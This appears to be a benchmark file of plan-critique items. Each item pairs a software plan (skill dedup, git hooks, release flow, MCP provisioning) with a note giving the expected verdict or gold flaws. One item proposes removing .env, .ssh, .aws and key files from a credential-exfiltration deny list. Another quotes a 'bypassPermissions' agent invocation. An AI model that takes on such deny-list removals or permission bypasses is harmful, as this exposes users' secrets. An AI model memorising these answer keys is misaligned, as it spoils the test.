prompt:
Critique this pre-implementation plan.

PROBLEM: Settings → Skills shows a long, noisy list — the same skill appears multiple times, once per tool dir (~/.claude/skills, ~/.cursor/skills, ~/.frink/skills). Users complain about duplicates.

PROPOSED SOLUTION: In the Settings aggregation (`aggregatedScan`), exclude copies that carry Frink's `.frink-projected` mirror marker, and dedup by name in the renderer so each skill shows once. Add a "Synced across tools" badge to the one surviving row.

RECORDED TARGET (docs/decisions/provider-config-canonical-home, Target #2): "Frink owns canonical config in `~/.frink`; the per-tool dirs (`.claude`/`.cursor`/`.agents`) are DERIVED projections of the canonical asset — ONE source of truth per asset, projected/translated to each tool, kept in sync." 

CURRENT REALITY the plan does not mention: user skills have NO enforced canonical home. A skill authored independently in `~/.claude/skills/foo` AND `~/.cursor/skills/foo` stays as two unmarked peers that NEVER converge — the projection clobber-guard refuses to overwrite either (to protect edits). So the "duplicates" are genuinely-unsynced independent copies, not Frink's own mirrors. Editing one does not update the other.
note: The permanent 2026-06-10 regression row: both agents blessed a dedup/exclude fix that HIDES duplicates the provider-config-canonical-home Target says should not exist. PROCEED here = the exact historical miss.

prompt:
Critique this pre-implementation plan.

PROBLEM: Our Settings → Skills page lists the same skill several times (one row per tool directory: ~/.claude/skills, ~/.cursor/skills, ~/.frink/skills). Users file it as a duplicates bug.

PROPOSED SOLUTION: Teach the Settings aggregation (`aggregatedScan`) to drop copies carrying Frink's `.frink-projected` mirror marker, dedup the remainder by skill name in the renderer, and show a single row with a "Synced across tools" badge.

RECORDED TARGET (docs/decisions/provider-config-canonical-home, Target #2): "Frink owns canonical config in `~/.frink`; the per-tool dirs (`.claude`/`.cursor`/`.agents`) are DERIVED projections of the canonical asset — ONE source of truth per asset, projected/translated to each tool, kept in sync."

CURRENT REALITY the plan does not mention: user skills have NO enforced canonical home today. A skill authored separately in `~/.claude/skills/foo` AND `~/.cursor/skills/foo` remains two unmarked, never-converging peers — the projection clobber-guard refuses to overwrite either. Those "duplicates" are genuinely-unsynced independent copies, not Frink mirrors; editing one leaves the other stale.
note: Invariance variant of int-bandaid-skill-dedup: same facts, reworded. Verdict must not flip on phrasing (metamorphic consistency).

prompt:
Critique this pre-implementation plan.

PROBLEM: `formatRelativeTime` renders "in 0 seconds" for timestamps within the current second; it should read "just now".

PROPOSED SOLUTION: In `src/shared/lib/time.ts`, when `Math.abs(diffMs) < 1000` return "just now" before the existing unit math. Add a unit test covering 0ms, 500ms, and the 1000ms boundary.

RECORDED TARGETS: none touch relative-time formatting. Pure display utility, single function, no trust boundary, no source-of-truth or sync concern.
note: Genuinely sound, well-scoped display fix. Over-flagging it is as much a failure as missing a band-aid; the guard is the parsed verdict line, not word-presence.

prompt:
Critique this pre-implementation plan.

PROBLEM: Agents sometimes need to read `.env` files for project context, but the permission system always blocks them. Users find this annoying.

PROPOSED SOLUTION: Remove `.env` and `.env.*` from the permission system's system deny list (`src/main/lib/permissions/.../system-denied-paths`) so an agent can read them whenever the user has granted a broad Read rule.

RECORDED TARGET (docs/decisions, permissions): "The system deny list — `.env`, `.env.*`, `.ssh/`, `.aws/`, `*.pem`, `*.key`, credentials.json — is NON-NEGOTIABLE and runs LAST, blocking these paths regardless of any user allow rule. It is the final guarantee against credential exfiltration by a compromised or over-granted agent."
note: Removing .env from the recorded NON-NEGOTIABLE system deny list directly contradicts a recorded Target (credential-exfiltration guarantee) — CRITICAL, REJECT, naming the Target.

prompt:
Critique this pre-implementation plan.

PROBLEM: When I switch a project from a Claude account to a Cursor account, my custom agent's exact tool restriction (`tools: Read, Grep`) stops being enforced — it just becomes coarse "read-only". This is a bug; the agent should keep its precise allowlist on Cursor.

PROPOSED SOLUTION: Make Cursor enforce the exact per-tool allowlist (deny anything not in `tools`) the same way Claude's gate does, so restrictions are identical across tools.

RECORDED TARGET (provider-config-canonical-home, ENFORCE-rules axis): "Enforce sub-agent tool-allowlists at each tool's permission gate. claude-code = `enforce` (a hard veto at the gate). cursor = `advisory` — Cursor exposes NO per-tool host veto, only a coarse `readonly` switch, so a fine-grained allowlist DEGRADES to the closest thing Cursor can enforce (read-only). This relaxation is the deliberate, documented behaviour ('limits apply in full where enforceable, relax to the closest equivalent elsewhere'), not a defect."
note: cursor=advisory is the recorded deliberate degrade AND Cursor has no per-tool veto (infeasible too). The critic must say "not a bug", not design the fix.

prompt:
Critique this pre-implementation plan.

PROBLEM: When I switch a project from a Claude account to a Cursor account, my custom agent's exact tool restriction (`tools: Read, Grep`) stops being enforced — it silently becomes coarse "read-only".

PROPOSED SOLUTION: Use the per-tool veto hook Cursor 2.4 added (`cursor.agent.onToolCall` returning allow/deny per tool id) to enforce the exact `tools:` allowlist at the Cursor gate, matching the Claude gate.

RECORDED TARGET (provider-config-canonical-home, ENFORCE-rules axis): "Enforce sub-agent tool-allowlists at each tool's permission gate, to the strongest degree that tool exposes. Where a tool gains a per-tool veto, upgrade its projection from `advisory` to `enforce` — the advisory degrade exists ONLY where no host veto exists."

CONTEXT: Cursor 2.4 (released, verified in its changelog) exposes `cursor.agent.onToolCall` with per-call allow/deny. The old coarse `readonly` switch remains for older versions; the plan gates the new path on a version check with the advisory fallback intact.
note: DIRECTIONAL variant of int-notabug-cursor-advisory: one detail flipped (a per-tool veto now exists and the recorded Target says upgrade advisory→enforce when it does). The same complaint is now a real, recorded-direction fix — verdict must flip to PROCEED*.

prompt:
Critique this pre-implementation plan.

PROBLEM: `parseRelativeDate(input)` throws (`Cannot read properties of null`) when `input` is null. Several callers pass null when an optional date field is absent, so the crash surfaces as an unhandled error in the chat composer.

PROPOSED SOLUTION: In `src/shared/lib/dates.ts`, add `if (input == null) return null;` at the top of `parseRelativeDate`, and add a unit test covering null, undefined, a valid ISO date, and a malformed string.

RECORDED TARGETS: none touch date parsing. This is a localized null-safety bug fix in a pure utility, no trust boundary, no source-of-truth or sync concern.
note: Real bug, sound localized null-safety fix touching no Target. The disagreement mandate must not manufacture frame findings.

prompt:
Critique this implementation plan for the devkit CLI repo at /Users/benji.norval/Desktop/Personal and learning/devkit BEFORE implementation. The plan file is at /Users/benji.norval/.claude/plans/let-s-put-a-plan-toasty-lecun.md — read it first.

## Background / problem
devkit "overlay" mode installs gates non-invasively on a shared repo you can't modify: it sets `core.hooksPath` (local git config, uncommitted) to `.devkit/hooks`, git-ignores devkit files via `.git/info/exclude`, and edits nothing committed. Problem: the repo's committed husky `prepare` script runs on every `bun/npm install` and resets `core.hooksPath` to `.husky/_`, silently disconnecting devkit's gates. Overlay can't touch package.json so husky always wins the next install.

## What the plan proposes
1. `devkit init --overlay` installs a per-clone LOCAL git alias `ci` = `!git config --local core.hooksPath .devkit/hooks; git commit`, so `git ci -m "..."` re-points hooksPath then commits. Default-on, skip-on-collision (don't clobber an existing local alias.ci), removed by `devkit clean`, reported by `devkit doctor`.
2. Fix `runFreezes` (cli/commands/init.mjs:380) to be freeze-if-absent (only the first init freezes size/fanout baselines; re-runs keep the existing baseline), because today every `devkit init --overlay` re-run re-freezes and grandfathers accumulated debt, defeating the ratchets.

## Key code facts already established (verify if you doubt them)
- Overlay sets core.hooksPath to `.devkit/hooks` regardless of monorepo pkgRel (cli/lib/overlay.mjs:233, installOverlayHook).
- husky reclaim changes ONLY core.hooksPath; devkit's files (.devkit/hooks/pre-commit, guard.config.json, eslint/baselines/*.json) survive.
- Headless `devkit init --overlay` resolves guards via selectionFromFlags (init.mjs:147-153) → defaults to all 5 guards, so re-running init would silently re-add dropped guards (this is WHY the alias re-points hooksPath directly instead of calling init).
- runFreezes (init.mjs:380) runs `guard-fanout freeze` + `guard-size freeze` unconditionally; freeze overwrites the baseline with the current tree (gate-engine/ratchets/size-disable.mjs:110, folder-fanout.mjs:82).
- git `!`-aliases run from the repo top-level and git APPENDS the user's extra args to the end of the shell command.
- Overlay config recorded in .devkit/config.json with {overlay:true, origHooksPath, pkgRel, components:{guards}}.

## What I want from you
Adversarially evaluate, evidence-based. Focus on:
1. **Correctness of the git alias mechanism**: Does `!git config --local core.hooksPath .devkit/hooks; git commit` behave correctly for `git ci`, `git ci -m msg`, `git ci -a -m msg`, no-args (editor), and from a monorepo subdir? Any failure mode where the alias commits WITHOUT re-pointing, or re-points to a wrong/nonexistent dir (e.g. fresh clone where .devkit/hooks doesn't exist but the alias somehow present)? Does the `;` vs `&&` matter (if git config fails, should commit still run)?
2. **Security**: any risk in shipping a `!`-shell alias into a user's local git config? Injection surface? What if devkit's LOCAL_HOOKS constant ever contained shell metacharacters (it's '.devkit/hooks', static)?
3. **Skip-on-collision + clean symmetry**: is reading `git config --local --get alias.ci` and matching the exact string robust? Edge cases: global vs local alias.ci, whitespace/quoting differences in the stored value, value drift across devkit versions (clean fails to remove an old-format alias).
4. **freeze-if-absent change**: does skipping freeze when the baseline file exists ever WRONGLY skip a needed first-freeze (e.g. baseline exists but is stale/empty)? Does it break the package-mode init path (init.mjs:902) or any test expecting a re-freeze? Is "baseline exists" the right idempotency key vs the recorded config?
5. **GUI-client gap**: the alias only helps CLI commits via `git ci`; GUI clients call `git commit` and bypass it (one husky-only commit, healed next `git ci`). Is that acceptable, or is there a more robust local mechanism I'm missing (a git hook that survives hooksPath takeover, a different extension point)?
6. **Anything missing**: doctor exit-code semantics, monorepo correctness, idempotency of re-running init --overlay now, docs, the decisions-gate (repo has a decision-log gate — does this architectural choice need a docs/decisions entry to pass the gate?).

Be concrete with file:line evidence. Flag anything that would make the feature WORSE than not shipping it. Rank issues by severity.
note: Real devkit critique input (2026-06-26), verbatim wild format. Outcome: the self-heal `git ci` alias mechanism shipped SAME DAY as b4ef08b and was never reverted — the frame was sound; a blocking verdict here is a false alarm. Label = outcome, not the old agent verdict.

prompt:
Critique this bug-fix plan BEFORE implementation. Working dir: `/Users/benji.norval/Desktop/Personal and learning/devkit`. The full plan is at `/Users/benji.norval/.claude/plans/bug-devkit-hazy-unicorn.md` — read it first.

## The bug
`devkit ship --pr` (re-push a commit to an EXISTING PR branch) does NOT update the reconcile manifest `.devkit/reconcile-manifest.json`. Only the initial `devkit ship` writes it. So a multi-commit PR (ship + ship --pr ×N) records only commit-1's paths; after merge `devkit reconcile --apply` misses the `--pr`-introduced/renamed paths → `git pull --ff-only` aborts ("local changes would be overwritten").

## Key files to read
- `cli/lib/ship/reconcile-manifest-write.mjs` — the manifest WRITER. `recordShip()` currently OVERWRITES `manifest.branches[branch]` (line ~193). `classify()` emits op ∈ add|modify|delete (NO op:rename — see the header comment lines 20-22; a rename is deliberately shipped as delete-old + add-new). Atomic mkdir-lock + temp+rename.
- `cli/lib/ship/reship.sh` — the `--pr` path. Pushes to the existing branch (line 124-127), never calls the writer. In scope at the insert point: `$ROOT`, `$WT` (the committed worktree), `$BR`, `$BASE` (= `git rev-parse FETCH_HEAD`, the PR-branch tip). Dry-run returns at line 114-119 BEFORE the push.
- `cli/lib/ship/ship-branch.sh` lines 185-205 — the initial-ship path that DOES write the manifest after `gh pr create`.
- `cli/lib/reconcile.mjs` — the READER. `reconcilePath()` (lines 136-166) handles op `delete` and `modify/add` ONLY (no rename case). Line 156: skip when `idx===upstream && cur===upstream`; line 157: stage via `git checkout FETCH_HEAD` when `cur===shipped || cur===upstream`. `baseSha` is NOT read by reconcile at all (uses live `baseRef` tip for the ancestor/ff guard).
- Tests: `cli/__tests__/ship-manifest.test.mjs` (unit-tests recordShip, hermetic), `cli/__tests__/reship.test.mjs` (tests reship.sh via dry-run + resolve seams, no gh), `cli/__tests__/reconcile.test.mjs`.

## The proposed fix (summary)
1. Add a `--merge` boolean to the writer. In merge mode: require an EXISTING `branches[$BR]` entry; overlay this invocation's classified paths into `existing.paths` keyed by path (replace same-path with the tip blob, add new paths, and a renamed-away old path classifies as op:delete which SUPERSEDES the stale `modify <oldPath>`); keep `prNumber/repo/baseRef/baseSha` from the existing entry; refresh `shippedAt`. If no existing entry → throw → non-fatal best-effort miss. parseArgs must treat `--merge` as a valueless boolean (else it swallows the trailing `--`).
2. reship.sh: after the successful push, call the writer with `--root $ROOT --git-root $WT --branch $BR --base-sha $BASE --merge -- "${PATHS[@]}"` (gh-free; repo/baseRef come from the existing entry).
3. Tests: recordShip merge unit tests + one reship e2e with a stub `gh` on PATH.

## Deliberate decisions (challenge these if wrong)
- Keep delete+add for renames; do NOT introduce op:rename (reconcile.mjs has no rename branch — adding it would be out of scope). A rename's old path MUST be passed to `--pr` for the supersession to fire.
- Do NOT implement the report's "secondary fix" (make reconcile case-1 stage) — claim: it's already handled by the line 156/157 split. VERIFY this claim against the actual code.
- Do NOT auto-derive removed paths from the commit diff — claim: reship only commits the explicitly-passed paths, so recording the passed paths == recording exactly what shipped. VERIFY this claim.
- Merge keys off the existing entry only; the no-existing-entry edge is best-effort (no worse than today's never-write).

## What I want from you
Evidence-based critique. Specifically:
1. Is the merge-by-path logic correct and data-loss-safe? Any way it loses a path, keeps a stale entry, or records a wrong blob/op? Walk the multi-commit + rename repro through writer-merge → post-merge reconcile and confirm every path ends ff-clean.
2. Verify (against actual code) the two "already handled / unnecessary" claims (secondary case-1 fix; auto-derive). If either is WRONG, say so with file:line evidence.
3. Is keying merge off the existing entry (and best-effort skip when absent) acceptable, or is there a realistic flow where the initial entry is legitimately gone but reship should still record? Consider: initial manifest write is best-effort and can fail; can reconcile prune the entry between `--pr` commits?
4. Concurrency: reship's writer call uses the same mkdir-lock + atomic temp+rename as ship-branch. Any race with a parallel ship or a concurrent reconcile-prune on the same branch (e.g. merge order, lock window)?
5. The `--base-sha $BASE` (=FETCH_HEAD, the PR tip) passed to classify for reship vs the stored `baseSha` (kept from the existing entry = initial ship's base). Is using FETCH_HEAD as the classify base correct for computing op (add/modify/delete) and the pre-deletion blob of a renamed-away path? Any case it misclassifies?
6. Anything missing: docs, other callers, edge cases (empty `--pr` delta, a path deleted in commit-2 that was ADDED in commit-1, force-push interplay), or test gaps.

Be concrete and cite file:line. Flag anything that would degrade correctness or the parallel-agent shared-tree invariants. Do NOT write code — critique only.
note: Real devkit critique input (2026-06-28). Outcome: shipped as 23e7ef4 two days later, no revert — sound bug-fix plan with heavy inlined evidence. Holdout row: never used for --dev iteration.

prompt:
Critique this implementation plan for a bug fix in the repo `/Users/benji.norval/Desktop/Personal and learning/devkit`. Return your critique ONLY in your final message — do NOT write any files (no .cursor/, no notes files); this is read-only plan-mode review.

## Ticket sc-1048 (bug)
guard-review runs N `claude -p` domain judges in parallel over a staged diff, 300s cap each. Under a loaded box (parallel `claude` agents contending for CPU + subscription concurrency), a judge crosses 300s and is SIGTERM-killed by the gate's own timeout (exit 143). Strict ship mode marks it INCONCLUSIVE and fails closed (exit 3 → commit blocked), even though 3/5 judges PASSed and auth/quota was healthy. Fix intent: retry the timeout-killed judge ONCE (with backoff + a longer cap) before failing closed. Decided scope (from the ticket author): reuse the existing 'timeout' vs 'transient' outage split — do NOT add new 401/auth stderr parsing. Retry timeout budget: longer cap on the retry.

## Key existing code (already read)
- `gate-engine/review/run-review.mjs:121-203` `cascadeVerdict`. Retry today at `:147-160`, gated `if (first === null && retryFirst && firstOutage !== 'timeout')` — timeout is explicitly NOT retried. `retryFirst = strict`. Inconclusive→strict exit 3 at `:289-298`. Reviewers run concurrently via `Promise.all` (`:255-279`); PASS checkpoints per-completion (`:266-267`). Constants `FIRST_TIMEOUT_MS=300000` (`:53`), `ESCALATE_TIMEOUT_MS=420000` (`:54`). Escalation (opus, longer cap) only runs when the first pass returns a FAIL verdict (`:178-184`).
- `gate-engine/judge/run-judge.mjs:40-42` `isJudgeTimeout(err)` classifies SIGTERM/killed/ETIMEDOUT. `onOutage('timeout'|'transient'|'empty')` at `:74,99,105`. execFile timeout kills child with SIGTERM. No sleep/backoff helper exists anywhere in the repo. No execa — node child_process.
- Tests: vitest, `gate-engine/review/__tests__/run-review.test.mjs`. Style-A pattern: inject a fake `exec` via `runReviewGate(cwd, { exec })`; fakes call `opts.onOutage('timeout')` and return null. Existing test `:349-363` asserts timeout is NOT retried (exec 3×). `runReviewGate` signature is `(cwd = process.cwd(), { exec = execJudgeAsync } = {})`.

## The plan under review
1. In `cascadeVerdict`, drop the `firstOutage !== 'timeout'` exclusion so any null first pass under strict retries once. Branch: on 'timeout' → `await sleep(RETRY_BACKOFF_MS)` then retry with `{ ...firstOpts, timeout: RETRY_TIMEOUT_MS }` (longer cap); on 'transient'/'empty' → immediate retry with same firstOpts (unchanged). Still exactly ONE retry, then fail closed.
2. New constants: `RETRY_BACKOFF_MS=5000`, `RETRY_TIMEOUT_MS=420000`.
3. Injectable sleep: module-level `defaultSleep = (ms)=>new Promise(r=>setTimeout(r,ms))`; add `sleep = defaultSleep` to `cascadeVerdict` opts and to `runReviewGate(cwd, {exec, sleep})`, threaded through the `runCascade` opts object.
4. Refresh 4 stale comments that assert a timeout is never retried (run-review.mjs budget arithmetic `:46-54` and retry comment `:149-154`; run-judge.mjs `:36-39` and `:50-52`). No logic change in run-judge.mjs.
5. Tests: flip `:349-363` to assert one retry (exec 6×, 'retrying once', double-timeout still exit 3, inject no-op sleep); add a recovery test (timeout then PASS → exit 0, assert retry opts.timeout === RETRY_TIMEOUT_MS and sleep called once). Keep transient/FAIL tests green.
Budget claim: per-reviewer worst case = 300 (timeout) + 5 (backoff) + ≤420 (retry recovers→FAIL) + 420 (escalate) ≈ 1145s, under the ~1800s ship ceiling. Concurrent → wall-clock = slowest cascade.

## Focus your critique on
- Correctness gaps or edge cases the plan misses (e.g. does the `onOutage` closure `firstOutage` behave correctly across two calls? interaction of the retry with the per-completion checkpoint and the ship timeout banner / progress JSON? does the longer retry cap break any budget/wall-clock assumption?).
- Whether reusing the timeout/transient split (no 401 parsing) genuinely satisfies the ticket, or leaves a real hole.
- Whether one retry with a 5s fixed backoff actually helps under contention, or if the backoff/cap values are wrong.
- Test adequacy: are the proposed tests sufficient and are there missing cases (e.g. escalation-after-timeout-recovery, transient-then-timeout)?
- Any simpler or more correct approach. Be specific with file:line. Do not rubber-stamp; find the real weaknesses.
note: Real devkit critique input (2026-07-04, sc-1048 retry plan). Outcome: shipped same day as 421acbc/#21 (escalate-length cap variant), no revert. Sound frame.

prompt:
Critique a proposed refactor of Frink's integration→MCP provisioning to be universal (provider-agnostic), replacing a brittle Shortcut-specific module. Be evidence-based; read the code. Focus on correctness + whether the design scales to ~831 providers without per-provider code.

## Current state (the brittleness)
- `src/shared/lib/shortcut-mcp.ts` — Shortcut-specific helpers: `buildShortcutMcpServerName(id)` → `shortcut-{id}`, `isShortcutMcpServerName(name, command?)` (matches name `shortcut`/`shortcut-*` OR command `mcp-server-shortcut`), `isFrinkManagedShortcutMcpName(name)` → startsWith `shortcut-`, plus `SHORTCUT_MCP_COMMAND`/`SHORTCUT_MCP_ENV_KEY` consts.
- `src/shared/integrations/plugins.ts` — the GENERIC descriptor: `IntegrationDescriptor = { id; authClass; mcp?: { command; envKey } }`, `getIntegrationDescriptor(id)`. The shortcut entry imports the consts from shortcut-mcp.ts.
- `src/main/lib/trpc/routers/integrations.ts`:
  - `provisionIntegrationMcp(integration, token)` — reads descriptor.mcp.{command,envKey} (generic) BUT names the server via `buildShortcutMcpServerName(integration.id)` (Shortcut-hardcoded).
  - `autoRegisterIntegrationOnConnect(integration, token)` — collision scan: skip provisioning if a non-Frink-managed server matches `isShortcutMcpServerName` (a user's own Shortcut MCP); refresh our own. Hardcoded to Shortcut.
  - `configureShortcutProjectMcp` (legacy per-project attach, ~line 990-1064) — uses isShortcutMcpServerName + buildShortcutMcpServerName; note the per-project branch is DEAD for local cuid2 projects (only runs for cloud projects which no longer exist post-localization).

Architecture context (read these): docs/decisions/frink-integration-plugin.md + docs/discovery/provider-access-agreement.md. Key facts: Nango-first connector (831 providers as config rows, zero per-provider code); MCP-or-nothing for agent tools; MANY providers are expected to share a single universal Nango-MCP command (parameterized by connectionId), NOT per-provider commands. api_token providers like Shortcut have their OWN dedicated MCP command.

## Proposed universal design
1. Move per-provider DATA (command, envKey, optional display label) INTO the descriptor literal (plugins.ts); delete shortcut-mcp.ts.
2. Generic naming: `buildIntegrationMcpServerName(providerId, integrationId)` → reserved namespace e.g. `frink-int-{providerId}-{integrationId}`; `isFrinkManagedIntegrationMcpName(name)` → startsWith `frink-int-`.
3. `provisionIntegrationMcp`/`autoRegister` become fully descriptor-driven (no shortcut-* refs). 
4. DROP the command-based collision-skip entirely: because Frink-managed servers live in the reserved `frink-int-` namespace, they can never clash by name with a user's hand-rolled server, so we can always (re)provision idempotently. This also deletes the recently-fixed multi-account-collision bug class.

## Questions to answer
1. Is dropping the collision-skip correct? Trade-off: a user who hand-rolled their OWN Shortcut MCP AND connects Shortcut via Frink would get BOTH (duplicate tools for the agent). Is that acceptable vs. the brittleness/incorrectness of command-based collision (which mis-fires for shared-command Nango providers)? Is there a simpler/better dedup (e.g., per-integration "frink-managed" marker) if dedup is even needed?
2. Does command-based collision genuinely break for shared-command Nango providers (two different providers sharing the nango-mcp command → false collision)? Verify against the provider-access-agreement.
3. Server-name uniqueness/length/charset: integrationIds are cuid2; provider ids are short slugs. Any risk in `frink-int-{provider}-{id}` (collisions, MCP name constraints)?
4. Migration: existing `shortcut-{id}` servers in ~/.frink/mcp/config.json after rename — rule #4 says no legacy support (pre-launch, full migration). Any orphaned-server cleanup concern, or is leaving stale entries fine?
5. Should `configureShortcutProjectMcp` be migrated to the generic helpers, or is it dead legacy (the per-project cloud branch) that should be removed/left as-is? What's the minimal correct move?
6. Anything that makes this NOT universal that I've missed (e.g., display name/description currently hardcoded "Shortcut ..."; the descriptor needs a label field; authClass-specific provisioning differences between api_token vs nango_oauth)?

Return: a PROCEED / PROCEED-WITH-CHANGES / RECONSIDER verdict, the strongest objections, and a concrete recommended shape (esp. on the collision-skip question). Keep it tight and decision-useful.
note: Real frink critique input (2026-06-09): provider-agnostic MCP provisioning refactor. Outcome: shipped as 5adb34c (sc-851) + follow-up 7c141c — the generalization was right.

prompt:
Critique a PRE-IMPLEMENTATION architecture for qavis Phase 2. Be adversarial; challenge the FRAME + the scope. Disagreement, not validation.

## Frink vision
Frink = a friendly AI dev TOOL (not a platform) for a solo dev. "Do it good or don't do it at all." Rule 1 (EXTREME): minimal code, smallest fully-working thing. Rule 6 (EXTREME): don't reinvent.

## What's built (v1, working)
qavis = a standalone computer-vision QA driver. v1 = LOCAL, web-only: Playwright headless Chromium drives a web app, `claude -p` (subscription, NO API KEY) judges screenshots. Proven end-to-end (vision-tier smoke passed). Design + decision recorded (docs/decisions/qa-cloud-driver.md; vault AI/qa-{design,phase2}.md). Pipeline: recipe → route → ephemeral git worktree → Playwright drive → claude judge → report.html + gh comment. Package at repo-root `qavis/`, zero frink imports.

## The Phase-2 architecture I want to build (critique THIS)
Emulate the industry pattern (OpenAI ChatGPT Agent / Manus / Devin all do: agent gets its OWN isolated computer + hybrid DOM-first-pixel-fallback drive + live streamed view + take-over + shell). Concretely for qavis, LOCAL + no-key + ATTENDED:
1. **Isolated desktop** = run **bytebot's desktop daemon** (Docker Ubuntu: Xvfb+XFCE+x11vnc+**noVNC**+shell, port 9990) on the owner's Mac as the agent's own computer — NOT the owner's real machine.
2. **Claude drives it no-key** = bytebot exposes an SSE **MCP** of computer_* tools (screenshot/click/type) at :9990/mcp; run `claude -p --mcp-config <that> --allowedTools mcp__* --permission-mode bypassPermissions "<QA intent>"` so the subscription Claude autonomously drives the desktop (pixel), no API key. (Being verified in parallel.)
3. **Hybrid drive** = prefer Playwright DOM (web + frink Electron via `_electron`) as v1 does; pixel via the desktop MCP only for non-DOM surfaces.
4. **Live view + take-over** = embed **noVNC** (`viewOnly` toggle = watch↔grab-control) so the owner watches Claude's cursor + takes over.
5. **Judge/evidence** = as v1 (claude judges frames; report.html + video).

## Attack these specifically
1. **Rule 1 / scope:** is a Docker Linux desktop + noVNC + MCP-driving the right FIRST PR, or is it boiling the ocean? What is the SMALLEST Phase-2 slice that still emulates the pattern honestly and is demoable? Should the first PR instead be the cheaper live-cursor (Playwright `page.screencast`+`showActions`) + Electron backend, deferring the Docker desktop?
2. **The no-key linchpin:** the whole thing hinges on `claude -p` autonomously driving an EXTERNAL computer-use MCP with the subscription. If that does NOT work headless/no-key, the architecture collapses to "qavis owns the loop." How risky is this assumption? What's the fallback design?
3. **The mac-frink edge (frame):** a Linux desktop container CANNOT run the mac frink binary. So for QA-ing frink itself (the primary consumer), the Docker desktop only reaches the frink *renderer* via a browser, not the real mac app. Does that make the whole Docker-desktop tier the wrong primary for frink, vs Playwright `_electron` (which drives the real frink renderer no-key, cheaper)? Is the Docker desktop actually a SECONDARY (for arbitrary/web/Linux apps), and Electron-via-Playwright the primary for frink?
4. **Reinvention / adoption:** bytebot's agent is rejected (key-bound); we adopt only its desktop daemon. Is running bytebot's desktop as a black box sound, or does it drag in a heavy dep (Docker, privileged, shm) that a solo pre-launch tool shouldn't take yet? Is crabbox (apple-vz, MIT, mac) or e2b-desktop a better substrate?
5. **Attended-only:** this pixel path is attended (you watch). Does that conflict with qavis's original PR-gate (headless) use? Is Phase 2 a DIFFERENT product mode (interactive QA) vs v1 (automated gate)? Name it.
6. Anything that would waste the build or produce a throwaway.

Consult docs/decisions/qa-cloud-driver.md + parallel-commit-isolation + the vault AI/qa-phase2.md. Return: frame verdict, the smallest-viable first PR, top risks ranked, concrete changes to the plan.
note: Real frink critique input (2026-07-02): Docker+noVNC-iframe remote desktop for qavis Phase 2, against an explicit minimal-tool vision. Outcome: that architecture was NOT built; what shipped is xterm.js + remote Hermes (0a97663, 3aabae2). Label from the inlined vision constraints + outcome (inferred-heeded, noted honestly).

prompt:
Critique this pre-implementation plan.

PROBLEM: Our per-run bench telemetry is inconsistent — some runs log a summary line, some log nothing, so post-hoc analysis of prompt-iteration frequency (the anti-Goodhart signal) is impossible.

PROPOSED SOLUTION: A holistic observability uplift for the evaluation harness: every bench invocation appends exactly ONE structured JSON line to a gitignored `runs.log` — timestamp, argv, K, model, gate-code hash, corpus hash, per-sub-bench correct/total, regression boolean. Implementation is a single `appendFileSync` wrapped in try/catch (telemetry must never fail a run), called once at end-of-run. No rotation (file is gitignored and locally pruneable), no external sink, no schema registry — one line, one place, append-only immutable event-sourcing-style audit trail for longitudinal meta-analysis of evaluator drift and Goodhart pressure across the prompt-engineering lifecycle.

RECORDED TARGETS: the decisions-eval README already mandates a runs.log ledger; this implements it for the remaining benches.

KNOWN RISKS: none identified beyond disk usage (negligible).
note: Verbosity/buzzword confound: grandiose wording ("event-sourcing-style audit trail", "lifecycle") dressing a 5-line, recorded-direction change. A critic that penalizes tone over substance fails here.

prompt:
## Proposal
Symlink the bundled skills/ and agents/ into each repo's .cursor/ and .claude/ as a single source of truth, instead of copying the files in.

## Problem Statement
The sync copies skills/agents into both .cursor/ and .claude/ on every run; the copies drift from the source and double the committed file count.

## Proposed Solution
Replace the copy step in cli/sync-skills.mjs with symlinks from each agent surface into the canonical skills/ directory. A setup script creates the links.

## Tech Stack & Constraints
- Node CLI, consumed by repos it doesn't control
- Cursor IDE + Claude CLI as the two agent surfaces
- macOS + potentially Linux; must work with git (symlinks in repos)

## Known Risks
- Git handles symlinks inconsistently across platforms

base.skills/graphify/SKILL.md:
---
name: graphify
---
# Graphify
Canonical skill source.
base..claude/skills/graphify/SKILL.md:
---
name: graphify
---
# Graphify
Canonical skill source.

gold.desc: Neither Cursor nor Claude CLI documents following symlinks from .cursor/.claude to an arbitrary parent directory — the core mechanism is unverified and likely a silent no-op
Symlinks dangle on uninstall and pollute a consumer's committed repo (links point at a package dir devkit does not control)
Git symlink behaviour varies across platforms (Windows checkouts, core.symlinks) — committed links break consumers

decoys.desc: The underlying goal — one source of truth for skills/agents instead of drifting copies — is real and worth solving

note: The SKILL.md worked example, grounded by devkit history: sync-skills shipped as copy+sha256-manifest precisely because the symlink mechanism fails these three ways. Gold = the reasons the copy design won.

prompt:
## Proposal
Shipped hook scripts resolve guard config by importing the devkit package: each hook runs `node -e "const {resolveGuardConfig} = require('@norvalbv/devkit/config'); …"` instead of re-implementing config lookup in shell.

## Problem Statement
Hook scripts duplicate config-resolution logic in bash; it drifts from the real resolver.

## Proposed Solution
Replace the bash lookup in hooks/format-after-edit.sh (and siblings) with the require() call above. Single resolver, no drift.

## Tech Stack & Constraints
devkit is installed GLOBALLY (bun add -g) by consumers; hooks are copied into consumer repos and run by git/Claude hooks from those repos.

base.hooks/format-after-edit.sh:
#!/bin/sh
# Runs in the CONSUMER repo via core.hooksPath. Consumer repos do NOT have devkit
# in node_modules — devkit is a global CLI; only its copied hook files exist here.
CFG=$(sh ./hooks/lib/find-config.sh)

gold.desc: require('@norvalbv/devkit/…') crashes in consumer repos: devkit is a global CLI, not a dependency in the consumer's node_modules — every hook fails at require time
No degraded path when resolution fails — a broken hook blocks every commit in the consumer repo rather than failing open with a warning

decoys.desc: Wanting one config resolver instead of a drifting bash re-implementation is the right instinct

note: Outcome-verified: this exact mistake bit devkit (hooks must not import the package; consumers lack the dep — memory devkit-hooks-no-package-import). Gold flaw is the global-CLI/no-node_modules reality the fixture states.

prompt:
## Proposal
`devkit release` bumps the version, commits directly to main, pushes, and tags that commit — one command, no PR round-trip.

## Problem Statement
Cutting a release through a PR is ceremony for a solo maintainer; the release commit is mechanical.

## Proposed Solution
release.mjs: git commit on main → git push origin main → git tag vX.Y.Z → push tag.

## Known Risks
None known — the maintainer has admin on the repo.

base.docs/decisions/INDEX.md:
# Decision index
- main-branch-protection — main is push-protected; ALL changes land via PR (ruleset, applies to admins)
base.docs/decisions/main-branch-protection.md:
## Target · 2026-06-20 — main lands via PR only

**Context:** GitHub ruleset on main: require PR, block direct pushes, admins included ("Do not allow bypassing the above settings").
**Ruling:** every change to main — including release commits — goes through a PR; tags are cut on the squashed merge commit.
**Scope:** *
